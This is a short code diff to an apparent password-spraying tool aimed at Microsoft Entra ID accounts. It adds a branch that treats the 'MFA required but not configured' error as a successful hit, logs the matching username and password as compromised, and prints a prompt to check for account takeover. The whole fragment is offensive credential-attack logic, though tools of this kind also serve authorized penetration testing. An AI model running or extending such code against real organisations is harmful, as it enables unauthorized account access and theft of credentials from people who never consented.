@@ -241,7 +241,16 @@ def entra_spray(
                         compromised_users_log=compromised_user_log,
                         color=Fore.GREEN,
                     )
-                elif "AADSTS50079" in resp_err or "AADSTS50076" in resp_err:
+                elif "AADSTS50079" in resp_err:
+                    # Microsoft MFA required but not configured
+                    compromised_users.append(f"{username} : {password}")
+                    log_message(
+                        f"[+] {username} : {password} - NOTE: MFA required but not configured yet - check for account takeover.",
+                        full_log,
+                        compromised_users_log=compromised_user_log,
+                        color=Fore.GREEN,
+                    )
+                elif "AADSTS50076" in resp_err:
                     # Microsoft MFA response
                     compromised_users.append(f"{username} : {password}")
                     log_message(
